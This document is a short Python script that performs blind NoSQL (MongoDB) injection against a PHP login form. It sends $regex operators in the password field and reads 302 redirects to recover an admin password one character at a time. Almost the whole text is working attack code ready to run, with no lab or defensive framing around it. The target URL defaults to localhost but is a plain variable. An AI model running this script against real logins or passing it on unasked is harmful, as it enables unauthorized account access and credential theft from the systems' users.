#Script for extracting passwords from vulnerable php logins using mongodb

import requests
import urllib3
import string
import urllib
#urllib3.disable_warnings()

username = 'admin'
password = ''
method = 'post'
url = 'http://127.0.0.1/index.php'
pname = 'password'
uname = 'username'
loop = 0

def makeRequest(tpassword=''):
  if method == 'get':
    r = requests.get(url+'?'+'%s='%(uname)+'%s'%(username)+'&%s[$regex]=^'%(pname)+tpassword,allow_redirects=False)
  else:
    payload={'%s'%(uname):'%s'%(username),'%s[$regex]'%(pname):'^%s'%(tpassword)}
    r = requests.post(url,data=payload,allow_redirects=False)
  return r


r=makeRequest('.*')
if r.status_code != 302:
  print('Could not verify mongodb injection, please check your arguments and or username supplied')
  exit()

print('Extracting password for user:%s'%(username))

while loop<1:
  loop += 1
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      tpassword=password+c
    else:
      tpassword=password+'\\'+c
    r=makeRequest(tpassword)
    if r.status_code == 302:
      password += c
      print("Found one more char : %s" % (password))
      loop=0
